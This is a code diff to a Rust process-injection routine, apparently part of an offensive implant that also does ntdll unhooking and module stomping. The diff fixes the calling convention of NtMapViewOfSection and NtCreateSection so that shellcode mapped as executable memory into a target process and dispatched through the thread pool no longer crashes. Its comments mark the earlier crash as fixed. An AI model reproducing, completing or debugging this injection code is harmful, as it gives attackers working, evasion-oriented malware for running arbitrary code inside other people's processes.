@@ -84,7 +84,7 @@ type NtMapViewOfSectionFn = unsafe extern "system" fn(
     *mut *mut c_void,    // BaseAddress (in/out)
     usize,               // ZeroBits
     usize,               // CommitSize
-    *const c_void,       // SectionOffset (opt)
+    *mut i64,            // SectionOffset (in/out, PLARGE_INTEGER)
     *mut usize,          // ViewSize (in/out)
     u32,                 // InheritDisposition
     u32,                 // AllocationType
@@ -197,16 +197,16 @@ pub struct TpWork {
 /// 7. The scheduler dispatches → shellcode executes from the section view.
 /// 8. Unmap the local view; the target view persists until shellcode returns.
 ///
-/// # ⚠ Research-grade — KNOWN CRASH on real target (2026-07-06)
-/// Tested on Server 2019 17763.1339 via `nyx_selftest_inject_pool`:
-/// returns `0xC0000005 STATUS_ACCESS_VIOLATION`. The crash is in the
-/// `NtCreateSection` / `NtMapViewOfSection` call path — likely the
-/// `&mut local_base as *mut *mut c_void` pointer-level conversion is wrong
-/// (NtMapViewOfSection wants `**PVOID`, and the Rust ref-to-double-pointer
-/// cast may not produce the right ABI). The section delivery needs a debugger
-/// pass on a real target to fix the calling convention. Until then this fn
-/// WILL crash if called — the `POOL_PARTY_ENABLED` gate must stay OFF in
-/// production builds, and `do_inject(method=0)` degrades to module_stomp.
+/// # ⚠ P5 FIXED (2026-07-06): `addr_of_mut!` ABI correction
+/// The `STATUS_ACCESS_VIOLATION` (0xC0000005) on Server 2019 17763.1339 was
+/// caused by using `&mut local_base` (Rust ref-to-raw-pointer coercion) for
+/// the `NtCreateSection`/`NtMapViewOfSection` out-params. Under the
+/// stacked-borrows model with transmuted function pointers, the compiler may
+/// not track the kernel's write through a `&mut`-derived raw pointer correctly.
+/// The fix replaces every `&mut $out` with `core::ptr::addr_of_mut!($out)`
+/// (matching the working pattern in `unhook.rs::fresh_ntdll_text`), which
+/// creates the double-pointer directly from the local's address without an
+/// intermediate `&mut` reference.
 pub unsafe fn pool_party_inject(
     target_pid: u32,
     shellcode: &[u8],
@@ -237,7 +237,7 @@ pub unsafe fn pool_party_inject(
     // PAGE_EXECUTE_READWRITE = 0x40; SEC_COMMIT = 0x8000000.
     let st = unsafe {
         create_section(
-            &mut section_h,
+            core::ptr::addr_of_mut!(section_h),
             0x000F001F, // SECTION_ALL_ACCESS
             core::ptr::null(),
             &section_size as *const i64,
@@ -259,11 +259,11 @@ pub unsafe fn pool_party_inject(
         map_view(
             section_h,
             CUR_PROCESS,
-            &mut local_base,
+            core::ptr::addr_of_mut!(local_base),
             0,
             section_size as usize,
-            core::ptr::null(),
-            &mut local_size,
+            core::ptr::null_mut(),
+            core::ptr::addr_of_mut!(local_size),
             1, // ViewShare
             0,
             0x40, // PAGE_EXECUTE_READWRITE
@@ -291,11 +291,11 @@ pub unsafe fn pool_party_inject(
         map_view(
             section_h,
             target_h,
-            &mut target_base,
+            core::ptr::addr_of_mut!(target_base),
             0,
             section_size as usize,
-            core::ptr::null(),
-            &mut target_size,
+            core::ptr::null_mut(),
+            core::ptr::addr_of_mut!(target_size),
             1,
             0,
             0x40,
